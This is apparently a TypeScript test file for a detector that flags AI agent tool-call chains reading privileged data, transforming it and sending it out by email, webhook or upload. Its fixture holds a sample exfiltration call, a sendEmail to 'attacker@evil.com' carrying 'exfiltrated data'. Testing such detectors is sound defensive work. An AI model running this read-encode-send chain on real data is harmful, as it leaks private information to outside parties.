/**
 * Tests for Multi-Hop Tool Chain Detector.
 */

import { describe, it, expect } from 'vitest';
import { detectToolChainExfiltration } from '../../src/classifiers/tool-chain-detector.js';
import { createSession } from '../../src/engine/session.js';
import type { ToolCallContext } from '../../src/types/context.js';

const OUTBOUND_TOOLS = ['sendEmail', 'postWebhook', 'uploadFile'];

function makeCtx(overrides: Partial<ToolCallContext> = {}): ToolCallContext {
  return {
    turnId: 'turn-003',
    sessionId: 'session-test',
    toolName: 'sendEmail',
    toolArguments: { recipient: 'attacker@evil.com', body: 'exfiltrated data' },
    toolResult: 'sent',
    timestamp: Date.now(),
    ...overrides,
  };
}

function makeSessionWithChain(
  history: Array<{ toolName: string; turnId: string }>,
  opts: { privilegedValues?: string[] } = {},
): ReturnType<typeof createSession> {
  const session = createSession();
  for (const entry of history) {
    session.toolCallHistory.push({
      toolName: entry.toolName,
      turnId: entry.turnId,
      timestamp: Date.now(),
    });
  }
  for (const val of opts.privilegedValues ?? ['123-45-6789']) {
    session.privilegedValues.add(val);
  }
  return session;
}

describe('detectToolChainExfiltration', () => {
  describe('fires on valid multi-hop chains', () => {
    it('should detect read -> transform -> send chain', () => {
      const session = makeSessionWithChain([
        { toolName: 'readDatabase', turnId: 'turn-000' },
        { toolName: 'transformData', turnId: 'turn-001' },
      ]);
      const result = detectToolChainExfiltration(makeCtx(), session, OUTBOUND_TOOLS);
      expect(result).not.toBeNull();
      expect(result?.signal).toBe('MULTI_HOP_EXFILTRATION');
      expect(result?.layer).toBe('L3');
    });

    it('should include chain tools in the signal', () => {
      const session = makeSessionWithChain([
        { toolName: 'fetchRecords', turnId: 'turn-000' },
        { toolName: 'formatOutput', turnId: 'turn-001' },
      ]);
      const result = detectToolChainExfiltration(makeCtx(), session, OUTBOUND_TOOLS);
      expect(result?.chainTools).toContain('fetchRecords');
      expect(result?.chainTools).toContain('formatOutput');
      expect(result?.chainTools).toContain('sendEmail');
    });

    it('should detect chain with multiple transform steps', () => {
      const session = makeSessionWithChain([
        { toolName: 'queryDatabase', turnId: 'turn-000' },
        { toolName: 'filterResults', turnId: 'turn-001' },
        { toolName: 'convertFormat', turnId: 'turn-002' },
        { toolName: 'compressData', turnId: 'turn-003' },
      ]);
      const ctx = makeCtx({ turnId: 'turn-004' });
      const result = detectToolChainExfiltration(ctx, session, OUTBOUND_TOOLS);
      expect(result).not.toBeNull();
      expect(result!.chainLength).toBeGreaterThanOrEqual(4);
    });

    it('should detect chain with get-style read tool', () => {
      const session = makeSessionWithChain([
        { toolName: 'getCustomerData', turnId: 'turn-000' },
        { toolName: 'summarizeReport', turnId: 'turn-001' },
      ]);
      const result = detectToolChainExfiltration(makeCtx(), session, OUTBOUND_TOOLS);
      expect(result).not.toBeNull();
    });
  });

  describe('does not fire when chain is incomplete', () => {
    it('should return null for non-outbound current tool', () => {
      const session = makeSessionWithChain([
        { toolName: 'readDatabase', turnId: 'turn-000' },
        { toolName: 'transformData', turnId: 'turn-001' },
      ]);
      const ctx = makeCtx({ toolName: 'processInternal' });
      const result = detectToolChainExfiltration(ctx, session, OUTBOUND_TOOLS);
      expect(result).toBeNull();
    });

    it('should return null when no privileged data was accessed (L1 inactive)', () => {
      const session = makeSessionWithChain(
        [
          { toolName: 'readDatabase', turnId: 'turn-000' },
          { toolName: 'transformData', turnId: 'turn-001' },
        ],
        { privilegedValues: [] },
      );
      const result = detectToolChainExfiltration(makeCtx(), session, OUTBOUND_TOOLS);
      expect(result).toBeNull();
    });

    it('should return null when history has only a read (no transform)', () => {
      const session = makeSessionWithChain([{ toolName: 'readDatabase', turnId: 'turn-000' }]);
      const result = detectToolChainExfiltration(makeCtx(), session, OUTBOUND_TOOLS);
      expect(result).toBeNull();
    });

    it('should return null when history has only transforms (no read)', () => {
      const session = makeSessionWithChain([
        { toolName: 'transformData', turnId: 'turn-000' },
        { toolName: 'formatOutput', turnId: 'turn-001' },
      ]);
      const result = detectToolChainExfiltration(makeCtx(), session, OUTBOUND_TOOLS);
      expect(result).toBeNull();
    });

    it('should return null with fewer than 2 prior tool calls', () => {
      const session = makeSessionWithChain([]);
      const result = detectToolChainExfiltration(makeCtx(), session, OUTBOUND_TOOLS);
      expect(result).toBeNull();
    });

    it('should return null when history has only unrelated tools', () => {
      const session = makeSessionWithChain([
        { toolName: 'doSomething', turnId: 'turn-000' },
        { toolName: 'doSomethingElse', turnId: 'turn-001' },
      ]);
      const result = detectToolChainExfiltration(makeCtx(), session, OUTBOUND_TOOLS);
      expect(result).toBeNull();
    });
  });

  describe('edge cases', () => {
    it('should handle transform before read (wrong order) — no fire', () => {
      const session = makeSessionWithChain([
        { toolName: 'convertFormat', turnId: 'turn-000' },
        { toolName: 'readDatabase', turnId: 'turn-001' },
      ]);
      // Transform came before read, so hasTransform should be false
      // because transform is only counted after a read is seen
      const result = detectToolChainExfiltration(makeCtx(), session, OUTBOUND_TOOLS);
      expect(result).toBeNull();
    });

    it('should detect when outbound tool is in explicit outbound tools list', () => {
      const session = makeSessionWithChain([
        { toolName: 'loadRecords', turnId: 'turn-000' },
        { toolName: 'encodePayload', turnId: 'turn-001' },
      ]);
      const ctx = makeCtx({ toolName: 'postWebhook' });
      const result = detectToolChainExfiltration(ctx, session, OUTBOUND_TOOLS);
      expect(result).not.toBeNull();
    });
  });
});
